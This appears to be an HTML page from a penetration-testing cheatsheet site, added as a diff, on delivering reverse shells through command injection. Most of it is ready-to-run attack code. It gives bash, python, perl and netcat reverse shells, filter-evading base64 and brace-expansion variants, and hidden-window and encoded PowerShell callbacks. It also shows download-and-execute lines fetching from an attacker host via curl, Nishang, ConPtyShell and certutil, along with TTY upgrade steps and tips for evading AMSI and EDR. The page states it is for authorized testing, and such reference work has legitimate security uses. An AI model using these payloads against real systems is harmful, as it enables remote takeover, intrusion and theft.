@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reverse shells · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Command Injection</nav><h1>Reverse shells</h1><p class="cx-lede">Delivering interactive shells through command injection - single-line payloads, base64-wrapped reverse shells, listener setup, and TTY upgrade.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059, T1071.001</span><span class="cx-tag">D3FEND D3-OTF, D3-NTA, D3-PSA</span><span class="cx-tag">IMPACT RCE</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Spawn a listener locally, send a single-line payload through the injection point that calls back to it. Base64-wrap the payload to survive filters and URL transit.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Listener
+nc -lvnp &lt;LPORT&gt;
+
+# Linux payload (bash TCP)
+;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;
+
+# Linux payload (base64-wrapped, filter-resistant)
+;bash -c &#x27;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88TEhPU1Q+LzxMUE9SVD4gMD4mMQ==}|{base64,-d}|{bash,-i}&#x27;
+
+# Windows payload (PowerShell TCP)
+;powershell -nop -w hidden -c &quot;$c=New-Object Net.Sockets.TCPClient(&#x27;&lt;LHOST&gt;&#x27;,&lt;LPORT&gt;);...&quot;</code></pre></figure>
+<p>Success indicator: connection inbound on your listener, prompt arrives.</p>
+<div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>This page covers shell <em>delivery through command injection</em> - single-line invocations that survive URL parameters and filters. The general shell catalog (every variant of bash/python/perl/php/ruby/socat/nc, Windows alternatives, ConPtyShell, etc.) belongs in a future Shells section. When you're not sure which page to use: if the constraint is the injection channel, use this one.</p>
+</div>
+<h2 id="listener-setup">Listener setup</h2>
+<p>Pick one. Stick with it for the engagement.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">nc -lvnp 4444                       # universal, no TTY features
+ncat -lvnp 4444                     # nmap&#x27;s nc, slightly nicer
+ncat --ssl -lvnp 4444               # TLS listener (for ssl-capable callbacks)
+rlwrap nc -lvnp 4444                # readline support - arrows, history
+pwncat-cs -lp 4444                  # auto TTY upgrade, file transfer</code></pre></figure>
+<p><code>pwncat-cs</code> is worth the install - it handles TTY upgrade, port forwarding, and file transfer automatically. <code>rlwrap nc</code> is the minimum civilized option.</p>
+<h2 id="linux-reverse-shells">Linux reverse shells</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<h3 id="bash-tcp-most-common">bash TCP (most common)</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;</code></pre></figure>
+<p>Works on most distros. <code>/dev/tcp</code> is a bash feature, not a real device - fails if the shell is dash or busybox.</p>
+<h3 id="bash-with-explicit-redirect-clearer-intent">bash with explicit redirect (clearer intent)</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1</code></pre></figure>
+<p>Same effect, no <code>bash -c</code> wrapper. Use when the injection point already runs through bash and you want fewer quote escapes.</p>
+<h3 id="filter-resistant-brace-expansion-variant">Filter-resistant brace-expansion variant</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88TEhPU1Q+LzxMUE9SVD4gMD4mMQ==}|{base64,-d}|{bash,-i}</code></pre></figure>
+<p>The <code>{a,b}</code> brace expansion injects spaces without using the space character - defeats space filters. Encode <code>bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1</code> with <code class="cx-ph" title="Listener host - your reverse-shell IP">&lt;LHOST&gt;</code> and <code class="cx-ph" title="Listener port - your reverse-shell port">&lt;LPORT&gt;</code> substituted before encoding:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo -n &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27; | base64 -w0</code></pre></figure>
+<h3 id="python-when-bash-is-unavailable">python (when bash is unavailable)</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;python3 -c &#x27;import socket,os,pty;s=socket.socket();s.connect((&quot;&lt;LHOST&gt;&quot;,&lt;LPORT&gt;));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</code></pre></figure>
+<p>Uses <code>pty.spawn</code> - the resulting shell already has partial TTY features, less work after callback.</p>
+<h3 id="nc-with-e-rare-modern-nc-strips-this">nc with <code>-e</code> (rare; modern nc strips this)</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;nc -e /bin/sh &lt;LHOST&gt; &lt;LPORT&gt;</code></pre></figure>
+<p>Most distro builds of nc lack <code>-e</code> for security. Test once; if it fails, don't waste another request.</p>
+<h3 id="nc-without-e-mkfifo-trick">nc without <code>-e</code> (mkfifo trick)</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;LHOST&gt; &lt;LPORT&gt; &gt;/tmp/f</code></pre></figure>
+<p>Works when nc is <code>-e</code>-stripped. Leaves <code>/tmp/f</code> behind - clean it up.</p>
+<h3 id="perl-always-installed-on-real-linux">perl (always installed on real Linux)</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;perl -e &#x27;use Socket;$i=&quot;&lt;LHOST&gt;&quot;;$p=&lt;LPORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#x27;</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<h3 id="powershell-reverse-shell-single-line">PowerShell reverse shell (single line)</h3>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;powershell -nop -w hidden -c &quot;$c=New-Object Net.Sockets.TCPClient(&#x27;&lt;LHOST&gt;&#x27;,&lt;LPORT&gt;);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String);$r2=$r+&#x27;PS &#x27;+(pwd).Path+&#x27;&gt; &#x27;;$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()&quot;</code></pre></figure>
+<p>The <code>-nop -w hidden</code> flags skip profile loading and hide the window. Substitute <code class="cx-ph" title="Listener host - your reverse-shell IP">&lt;LHOST&gt;</code> and <code class="cx-ph" title="Listener port - your reverse-shell port">&lt;LPORT&gt;</code> literally - these are PowerShell strings, no encoding needed.</p>
+<h3 id="encoded-powershell-filter-bypass">Encoded PowerShell (filter bypass)</h3>
+<p>When <code>powershell</code> or shell metacharacters are filtered, encode the entire payload:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># On your local machine, generate the encoded command
+echo -n &#x27;$c=New-Object Net.Sockets.TCPClient(...)&#x27; | iconv -t UTF-16LE | base64 -w0</code></pre></figure>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;powershell -nop -w hidden -enc &lt;BASE64-UTF16LE&gt;</code></pre></figure>
+<p><code>-enc</code> (alias for <code>-EncodedCommand</code>) accepts UTF-16LE base64. The <code>iconv -t UTF-16LE | base64</code> chain is how to produce it from Linux.</p>
+<h3 id="nishang-invoke-powershelltcp-download-and-run">Nishang Invoke-PowerShellTcp (download-and-run)</h3>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;powershell -nop -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://&lt;ATTACKER&gt;/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress &lt;LHOST&gt; -Port &lt;LPORT&gt;&quot;</code></pre></figure>
+<p>You host <a href="https://github.com/samratashok/nishang">Nishang's <code>Invoke-PowerShellTcp.ps1</code></a> (append <code>Invoke-PowerShellTcp -Reverse -IPAddress ... -Port ...</code> at the bottom of the file, or use the <code>-c</code> form above) on <code class="cx-ph" title="Replace with your attacker value">&lt;ATTACKER&gt;</code> (<code>python3 -m http.server 80</code>).</p>
+<h3 id="certutil-drop-and-execute-cmdexe-no-powershell">certutil drop-and-execute (cmd.exe, no PowerShell)</h3>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">&amp;certutil -urlcache -split -f http://&lt;ATTACKER&gt;/nc.exe %TEMP%\nc.exe&amp;%TEMP%\nc.exe -e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;</code></pre></figure>
+<p>Uses signed Microsoft binaries (<code>certutil</code>). <code>nc.exe</code> from <a href="https://github.com/int0x33/nc.exe/">int0x33's nc.exe</a> or build static.</p>
+<h3 id="conptyshell-full-tty-on-windows">ConPtyShell (full TTY on Windows)</h3>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;IEX(IWR -UseBasicParsing http://&lt;ATTACKER&gt;/Invoke-ConPtyShell.ps1);Invoke-ConPtyShell &lt;LHOST&gt; &lt;LPORT&gt;</code></pre></figure>
+<p><a href="https://github.com/antonioCoco/ConPtyShell">antonioCoco/ConPtyShell</a>. Listener side: <code>stty raw -echo; nc -lvnp &lt;LPORT&gt;</code>. Result is a real PTY - tab completion, arrows, vim work.</p>
+</div>
+</div>
+<h2 id="wrapping-payloads-for-cmdi-delivery">Wrapping payloads for cmdi delivery</h2>
+<p>The injection point typically can't take a multi-line script and frequently filters spaces, slashes, or quotes. Three patterns get you around this.</p>
+<h3 id="pattern-1-base64-shell-wrapper">Pattern 1 - base64 + shell wrapper</h3>
+<p>Encode the entire payload, decode at runtime:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Step 1: encode
+echo -n &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27; | base64 -w0
+# Output: YmFzaCAtaSA+Ji...
+
+# Step 2: deliver
+;bash -c &quot;$(echo YmFzaCAtaSA+Ji... | base64 -d)&quot;
+# Or with bash herestring (no pipe character):
+;bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;YmFzaCAtaSA+Ji...)</code></pre></figure>
+<p>The herestring form avoids <code>|</code>, useful when pipe is filtered.</p>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell"># Step 1: encode (UTF-16LE for -EncodedCommand)
+echo -n &#x27;$c=New-Object Net.Sockets.TCPClient...&#x27; | iconv -t UTF-16LE | base64 -w0
+
+# Step 2: deliver
+;powershell -nop -w hidden -enc &lt;BASE64&gt;</code></pre></figure>
+</div>
+</div>
+<h3 id="pattern-2-download-and-execute">Pattern 2 - download-and-execute</h3>
+<p>When the payload is too long for the field:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;curl &lt;ATTACKER&gt;/r.sh|bash
+;wget -qO- &lt;ATTACKER&gt;/r.sh|bash
+;curl -s &lt;ATTACKER&gt;/r.sh|sh                 # if bash is filtered</code></pre></figure>
+<p>Host <code>r.sh</code> containing the actual payload via <code>python3 -m http.server 80</code>.</p>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;iex(iwr -UseBasicParsing &lt;ATTACKER&gt;/r.ps1)
+;IEX(New-Object Net.WebClient).DownloadString(&#x27;&lt;ATTACKER&gt;/r.ps1&#x27;)</code></pre></figure>
+</div>
+</div>
+<h3 id="pattern-3-write-file-execute-file">Pattern 3 - write file, execute file</h3>
+<p>When outbound is blocked but you can write to disk:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">;echo &#x27;YmFzaCAtaSA+Ji...&#x27; | base64 -d &gt; /tmp/.r;chmod +x /tmp/.r;/tmp/.r</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">;[IO.File]::WriteAllText(&#x27;C:\Windows\Temp\r.ps1&#x27;,&#x27;&lt;payload&gt;&#x27;);powershell -ep bypass C:\Windows\Temp\r.ps1</code></pre></figure>
+</div>
+</div>
+<h2 id="tty-upgrade-after-callback">TTY upgrade after callback</h2>
+<p><code>nc</code> callbacks are dumb shells. Upgrade them so <code>Ctrl+C</code> doesn't kill the session and tab completion works.</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">Linux</p>
+<p>Inside the dumb shell:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;    # spawn a PTY
+# then: Ctrl+Z to background nc</code></pre></figure>
+<p>On your local machine:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">stty raw -echo; fg                                 # raw mode, foreground nc
+# press Enter twice
+export TERM=xterm-256color
+stty rows &lt;N&gt; cols &lt;M&gt;                             # match your terminal</code></pre></figure>
+<p>Get rows/cols by running <code>stty size</code> in a fresh local terminal first.</p>
+<p>Modern alternative - <code>pwncat-cs</code> does all of this automatically:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">pwncat-cs -lp &lt;LPORT&gt;</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Windows</p>
+<p>PowerShell callbacks have no PTY by default. For a real PTY on Windows, use ConPtyShell (see above). Otherwise, accept the limitations:</p>
+<ul>
+<li>No <code>Ctrl+C</code> (it kills the session). Use long-running commands carefully.</li>
+<li>No tab completion in the remote shell.</li>
+<li>Some interactive tools (<code>vim</code>, <code>nano</code>, full <code>powershell_ise</code>) won't work.</li>
+</ul>
+</div>
+</div>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>Listener doesn't receive connection.</strong> Check the firewall on your end first (<code>sudo ufw allow &lt;LPORT&gt;</code> or equivalent). Then check the target can route outbound: send a <code>curl &lt;ATTACKER&gt;</code> probe before the shell payload to verify outbound 80/443 works.</li>
+<li><strong><code>/dev/tcp</code> doesn't exist.</strong> Target shell is dash, busybox, or restricted. Fall back to python, perl, or download-and-run a static nc.</li>
+<li><strong>Shell connects then dies.</strong> PHP's <code>system()</code> waits for the child; the page request times out and the worker is killed, taking your shell with it. Detach the child: <code>;bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1' &amp;</code> (note the trailing <code>&amp;</code>) or <code>;nohup bash -c '...' &amp;</code>.</li>
+<li><strong>PowerShell payload blocked by AMSI.</strong> Modern Windows scans PowerShell strings before execution. Encoded commands sometimes bypass simple AMSI; sophisticated EDR catches them anyway. Move to a binary loader (msfvenom-generated <code>.exe</code> delivered via <code>certutil</code>) or use <code>Invoke-Obfuscation</code> on the script.</li>
+<li><strong>Reverse shell connects but no prompt.</strong> PHP/Node sometimes captures stdout and never returns it. The shell is alive on the listener; type a command and press Enter to see if it responds. If not, the back-end is buffering - try <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> blindly.</li>
+<li><strong>Quotes mangled by URL encoding.</strong> Single and double quotes in the payload survive URL transit but break inside nested shells. Use <code>\u0027</code> substitution, base64-wrap the whole thing, or stage with download-and-run.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>The cmdi-specific problem is <em>delivery</em>, not <em>catalog</em>. Once the callback lands, you have a regular shell - every post-exploitation technique applies, every shell upgrade trick works, and platform-specific payload variants (the dozens of bash/python/perl/php/ruby variants) are not unique to command injection. Pick one delivery payload, get the callback, then operate normally.</p></article><nav class="cx-pager"><a class="cx-prev" href="../blind/index.html">Previous: Blind &amp; OOB</a><a class="cx-next" href="../filter-bypass/index.html">Next: Filter bypass</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
